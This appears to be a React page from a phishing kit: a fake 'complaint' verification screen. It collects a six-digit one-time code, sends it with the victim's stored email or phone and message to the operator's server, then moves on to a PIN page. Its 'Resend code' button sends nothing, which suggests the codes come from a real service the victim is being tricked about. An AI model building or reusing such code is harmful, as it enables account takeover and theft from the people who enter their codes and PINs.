import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import BASE_URL from '../components/urls';


const OTP_LENGTH = 6;
const RESEND_SECONDS = 60;
const pad = (n) => String(n).padStart(2, '0');

const Otp = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState(new Array(OTP_LENGTH).fill(''));
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [seconds, setSeconds] = useState(RESEND_SECONDS);
  const [canResend, setCanResend] = useState(false);
  const inputsRef = useRef([]);
  const vm  = localStorage.getItem('verificationMethod') || 'email';
  const ce  = localStorage.getItem('complaintEmail')     || '';
  const cp  = localStorage.getItem('complaintPhone')     || '';
  const cm  = localStorage.getItem('complaintMessage')   || '';
  const contact = vm === 'phone' ? cp : ce;
  const displayTarget = contact || (vm === 'phone' ? 'your phone number' : 'your email address');
  const isPhone = vm === 'phone';
  useEffect(() => { inputsRef.current[0]?.focus(); }, []);
  useEffect(() => {
    if (seconds <= 0) { setCanResend(true); return; }
    const t = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [seconds]);
  const handleChange = (e, i) => {
    const val = e.target.value.replace(/[^0-9]/g, '').slice(-1);
    const next = [...otp]; next[i] = val; setOtp(next); setError('');
    if (val && i < OTP_LENGTH - 1) inputsRef.current[i + 1]?.focus();
  };
  const handleKeyDown = (e, i) => {
    if (e.key === 'Backspace' && !otp[i] && i > 0) inputsRef.current[i - 1]?.focus();
  };
  const handleSubmit = () => {
    const code = otp.join('');
    if (code.length < OTP_LENGTH) { setError('Please enter all 6 digits.'); return; }
    setLoading(true); setError('');
    axios.post(BASE_URL + '/otp', {
      otp: code,
      verificationMethod: vm,
      phone: vm === 'phone' ? contact : undefined,
      email: vm === 'email' ? contact : undefined,
      complaintMessage: cm,
    })
      .then(() => { localStorage.setItem('otpVerified', 'true'); setTimeout(() => { setLoading(false); navigate('/pin'); }, 500); })
      .catch(() => { setTimeout(() => { setLoading(false); setError('Something went wrong.'); setOtp(new Array(OTP_LENGTH).fill('')); inputsRef.current[0]?.focus(); }, 600); });
  };
  const handleResend = () => {
    if (!canResend) return;
    setSeconds(RESEND_SECONDS); setCanResend(false); setOtp(new Array(OTP_LENGTH).fill('')); setError('');
    inputsRef.current[0]?.focus();
  };
  const allFilled = otp.every((d) => d !== '');
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return (
    <div className='min-h-screen bg-white flex justify-center'>
      <div className='w-full max-w-[430px] min-h-screen flex flex-col'>
        <div className='flex items-center px-4 pt-12 pb-2'>
          <button onClick={() => navigate(-1)} className='flex items-center justify-center active:opacity-60 transition-opacity' aria-label='Back'>
            <img src="/logo.png" alt="Back" style={{ height: "120px", width: "auto" }} />
          </button>
          <h2 className='flex-1 text-center text-[17px] font-semibold text-gray-900'>
            Verify your {isPhone ? 'phone' : 'email'}
          </h2>
        </div>
        <div className='flex-1 px-5 pt-7'>
          <p className='text-[15px] text-gray-800 leading-relaxed mb-4'>
            {"We've sent a code via "}{isPhone ? 'SMS' : 'Email'}{". Enter 6-digit code sent to "}
            <span className='font-bold text-gray-900'>{displayTarget}</span>
          </p>
          <p className='text-[14px] text-gray-500 mb-2'>{"If you didn't get a code from us, one of the following could be wrong -"}</p>
          <ol className='list-decimal pl-5 mb-8 space-y-[6px]'>
            <li className='text-[14px] text-gray-500'>The code is in your spam folder</li>
            <li className='text-[14px] text-gray-500'>The {isPhone ? 'phone number' : 'email address'} you entered has a typo</li>
            <li className='text-[14px] text-gray-500'>You accidentally entered the wrong {isPhone ? 'phone number' : 'email address'}</li>
          </ol>
          <p className='text-[15px] font-bold text-gray-900 mb-5'>6 Digit Code</p>
          <div className='flex justify-between gap-2 mb-3'>
            {otp.map((digit, i) => (
              <input
                key={i}
                ref={(el) => { inputsRef.current[i] = el; }}
                type='text'
                inputMode='numeric'
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(e, i)}
                onKeyDown={(e) => handleKeyDown(e, i)}
                className={
                  'w-11 h-12 text-center text-[20px] font-bold bg-transparent outline-none transition-all border-b-[2.5px] ' +
                  (digit ? 'border-[#6B4EFF] text-gray-900' : 'border-gray-300 text-gray-900')
                }
                style={{ caretColor: '#6B4EFF' }}
                aria-label={'OTP digit ' + (i + 1)}
              />
            ))}
          </div>
          {error && <p className='mt-2 text-[13px] text-red-500 font-medium'>{error}</p>}
          <p className='mt-8 text-[14px] text-gray-400'>
            {canResend ? (
              <button type='button' onClick={handleResend} className='text-[#6B4EFF] font-semibold'>Resend code</button>
            ) : (
              <span>Resend code in <span className='text-gray-600 font-medium'>{pad(mins)}:{pad(secs)}</span></span>
            )}
          </p>
        </div>
        <div className='px-5 pb-10'>
          <button type='button' onClick={handleSubmit} disabled={!allFilled || loading} className={'w-full py-[18px] rounded-full text-[17px] font-bold transition-all duration-200 ' + (allFilled && !loading ? 'bg-[#6B4EFF] text-white' : 'bg-[#d1d5db] text-white cursor-not-allowed')}>
            {loading ? 'Verifying...' : 'Continue'}
          </button>
        </div>
      </div>
    </div>
  );
};

export default Otp;